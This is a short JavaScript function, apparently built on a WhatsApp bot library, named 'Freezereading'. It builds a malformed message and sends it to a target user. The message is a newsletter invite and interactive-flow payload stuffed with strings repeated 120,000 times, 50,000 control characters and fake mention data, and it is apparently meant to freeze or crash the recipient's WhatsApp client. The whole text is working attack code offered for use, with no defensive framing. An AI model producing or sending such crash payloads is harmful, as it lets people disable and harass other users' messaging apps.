async function Freezereading(target, ptcp = true) {
    try {
        const repeatText = "軎?".repeat(120000);
        const captionText = repeatText + "@9".repeat(120000);
        const binaryText = "\u0018".repeat(50000);

        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: "33333333333333333@newsletter",
                        newsletterName: `AnomaliGEN2${repeatText}`,
                        jpegThumbnail: "",
                        caption: captionText,
                        inviteExpiration: Date.now() + 21 * 24 * 60 * 60 * 1000, // 21 hari
                    },
                },
            },

            nativeFlowMessage: {
                messageParamsJson: "",
                buttons: [
                    {
                        name: "call_permission_request",
                        buttonParamsJson: "{}",
                    },
                    {
                        name: "galaxy_message",
                        paramsJson: {
                            screen_2_OptIn_0: true,
                            screen_2_OptIn_1: true,
                            screen_1_Dropdown_0: "nullOnTop",
                            screen_1_DatePicker_1: "1028995200000",
                            screen_1_TextInput_2: "null@gmail.com",
                            screen_1_TextInput_3: "94643116",
                            screen_0_TextInput_0: binaryText,
                            screen_0_TextInput_1: "SecretDocu",
                            screen_0_Dropdown_2: "#926-Xnull",
                            screen_0_RadioButtonsGroup_3: "0_true",
                            flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                        },
                    },
                ],
            },

            contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "{ Kipop.Cloud }",
                    },
                ],
            },
        };

        await sock.relayMessage(target, message, { userJid: target });
    } catch (err) {
        console.error("❌ Error sending newsletter:", err);
    }
}